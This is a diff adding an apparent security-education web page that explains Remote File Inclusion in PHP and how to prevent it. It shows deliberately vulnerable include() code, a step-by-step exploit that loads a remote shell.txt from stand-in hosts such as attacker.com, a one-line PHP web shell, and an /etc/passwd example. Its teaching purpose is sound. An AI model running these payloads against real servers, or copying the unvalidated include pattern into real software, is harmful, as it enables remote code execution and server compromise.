@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Remote File Inclusion (RFI) - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>📂 Remote File Inclusion (RFI)</h1>
+    <p class="subtitle">Learn how attackers inject remote files into vulnerable web apps – and how to prevent it.</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>What is Remote File Inclusion?</h2>
+      <p>
+        RFI is a critical web vulnerability that allows an attacker to include and execute a malicious file from a remote server, usually due to insecure use of dynamic file loading functions in web applications. It is most commonly found in PHP apps using <code>include()</code> or <code>require()</code> functions without proper validation.
+      </p>
+    </section>
+
+    <section class="examples">
+      <h2>💥 How Does RFI Work?</h2>
+      <p>Consider the following vulnerable PHP code:</p>
+      <pre><code>// vulnerable.php
+&lt;?php
+  $page = $_GET['page'];
+  include($page);  // No validation
+?&gt;</code></pre>
+      <p>An attacker could exploit this by providing a remote URL:</p>
+      <pre><code>https://vulnerable-site.com/vulnerable.php?page=http://attacker.com/shell.txt</code></pre>
+      <p>If the remote file contains malicious PHP code, it will be executed on the server.</p>
+    </section>
+
+    <section class="types">
+      <h2>📚 RFI vs LFI: What's the Difference?</h2>
+      <div class="card">
+        <strong>RFI (Remote File Inclusion)</strong> loads files from remote URLs like <code>http://evil.com/shell.txt</code>.<br/>
+        <strong>LFI (Local File Inclusion)</strong> includes local files like <code>/etc/passwd</code> or <code>../../index.php</code>.
+      </div>
+    </section>
+
+    <section class="step-by-step">
+      <h2>🛠️ Step-by-Step Exploitation Example</h2>
+      <ol>
+        <li>Find a parameter that loads files dynamically (e.g. <code>?page=</code>)</li>
+        <li>Test with a basic file: <code>?page=http://attacker.com/info.txt</code></li>
+        <li>Prepare a remote malicious script with PHP payload:
+          <pre><code>// shell.txt
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+        </li>
+        <li>Trigger the payload: 
+          <code>?page=http://attacker.com/shell.txt&cmd=whoami</code>
+        </li>
+      </ol>
+      <p>If vulnerable, the server will execute the remote code and return the result.</p>
+    </section>
+
+    <section class="real-world">
+      <h2>🌐 Real-World Case Study</h2>
+      <p>
+        In 2007, a vulnerability in <strong>PHP-Nuke</strong> allowed attackers to inject remote shells via RFI. Thousands of websites were compromised. Even today, many legacy apps using older PHP versions remain exposed if <code>allow_url_include</code> is enabled.
+      </p>
+    </section>
+
+    <section class="tips">
+      <h2>✅ Prevention Techniques</h2>
+      <ul>
+        <li><strong>Disable remote file includes</strong>:
+          <pre><code>php.ini:
+allow_url_include = Off
+allow_url_fopen = Off</code></pre>
+        </li>
+        <li><strong>Whitelist allowed files</strong> instead of using unsanitized input.</li>
+        <li><strong>Use secure frameworks</strong> that abstract file loading logic.</li>
+        <li><strong>Validate & sanitize user inputs</strong> strictly.</li>
+      </ul>
+    </section>
+
+    <section class="resources">
+      <h2>📌 Tools & Resources</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/Remote_File_Inclusion" target="_blank">OWASP: RFI Overview</a></li>
+        <li><a href="https://github.com/tennc/webshell" target="_blank">Web Shell Payload Collection</a></li>
+        <li><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank">PortSwigger Path Traversal Labs</a></li>
+        <li><a href="https://github.com/projectdiscovery/nuclei-templates" target="_blank">Nuclei RFI Detection Templates</a></li>
+      </ul>
+    </section>
+
+    <section class="pro-tips">
+      <h2>💡 Pro Tips</h2>
+      <ul>
+        <li>Look for URLs that reflect file-based parameters: <code>?template=</code>, <code>?module=</code>, <code>?include=</code></li>
+        <li>Check PHP settings via <code>phpinfo()</code> to see if <code>allow_url_include</code> is enabled</li>
+        <li>Use Burp Suite Intruder or FuzzDB payloads for automated testing</li>
+        <li>Combine RFI with <strong>Command Injection</strong> or <strong>Privilege Escalation</strong> if a shell is achieved</li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
